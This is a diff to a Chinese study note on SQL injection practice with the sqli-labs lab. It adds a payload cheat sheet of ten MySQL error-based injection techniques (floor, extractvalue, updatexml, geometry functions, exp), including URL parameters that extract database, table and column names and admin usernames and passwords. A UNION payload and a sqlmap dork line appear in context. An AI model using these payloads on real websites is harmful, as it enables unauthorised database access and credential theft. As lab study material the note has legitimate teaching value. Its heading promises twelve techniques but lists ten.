@@ -4,7 +4,7 @@
 
 ## 使用sqli-lab练习sql注入
 
-### Less-1注入
+### Less-1 Union注入
 
 1. 注入查询数据库名：
 http://192.168.202.148:85/Less-1/?id=861' union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+
@@ -142,4 +142,45 @@ sqlmap.py -g “inurl:asp?id=1” /*””内为搜索语法，如：inurl,intit
 1. [SQLMAP简单使用](https://jingyan.baidu.com/article/eae078276530621fec5485b9.html)
 2. [SQL Map基础操作学习](https://www.jianshu.com/p/17509d0a1ba3)
 
+
+## 12种报错注入
+
+### 1. 通过floor报错,注入语句如下:
+select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
+
+### 2. 通过ExtractValue报错,注入语句如下:
+select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
+
+### 3. 通过UpdateXml报错,注入语句如下:
+select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
+```
+	爆数据库版本信息：?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
+	链接用户：?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)
+	链接数据库：?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)
+	爆库：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)
+	爆表：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)
+	爆字段：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)
+	爆字段内容：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)
+```
+
+### 4. 通过GeometryCollection()报错,注入语句如下:
+select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
+
+### 5. 通过multipoint()报错,注入语句如下:
+select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));
+
+### 6. 通过polygon()报错,注入语句如下:
+select * from test where id=1 and polygon((select * from(select * from(select user())a)b));
+
+### 7. 通过multipolygon()报错,注入语句如下:
+select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));
+
+### 8. 通过linestring()报错,注入语句如下:
+select * from test where id=1 and linestring((select * from(select * from(select user())a)b));
+
+### 9. 通过multilinestring()报错,注入语句如下:
+select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
+
+### 10. 通过exp()报错,注入语句如下:
+select * from test where id=1 and exp(~(select * from(select user())a));
 
